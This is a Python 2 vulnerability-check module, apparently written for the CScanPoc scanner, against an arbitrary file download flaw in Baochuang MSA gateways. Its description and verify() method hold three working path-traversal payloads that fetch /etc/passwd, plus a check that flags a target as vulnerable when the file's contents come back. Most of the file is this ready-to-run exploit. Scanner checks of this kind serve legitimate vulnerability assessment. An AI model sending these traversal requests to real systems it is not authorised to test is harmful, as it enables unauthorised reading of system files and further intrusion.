# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Baochuang_0001'  # 平台漏洞编号，留空
    name = '宝创科技MSA 处任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2015-05-26'  # 漏洞公布时间
    desc = '''
        上海宝创科技 MSA 新一代网关安全与管理的领导者，访问以下页面可直接下载相应文件。
        /../../../../etc/passwd
        /msa/../../../../etc/passwd
        /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '宝创科技MSA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '77937a7a-60cf-4f0b-a3b1-522aeee888c6'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://wooyun.org/bugs/wooyun-2015-0112275
            # refer: http://www.wooyun.org/bugs/wooyun-2010-0115645
            hh = hackhttp.hackhttp()
            arg = self.target
            payloads = [
                arg + '/../../../../etc/passwd',
                arg + '/msa/../../../../etc/passwd',
                arg + '/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd'
            ]
            for payload in payloads:
                code, head, res, err, _ = hh.http(payload)
                if code == 200 and 'root:' in res:
                    #security_hole('Arbitral file download: ' + payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
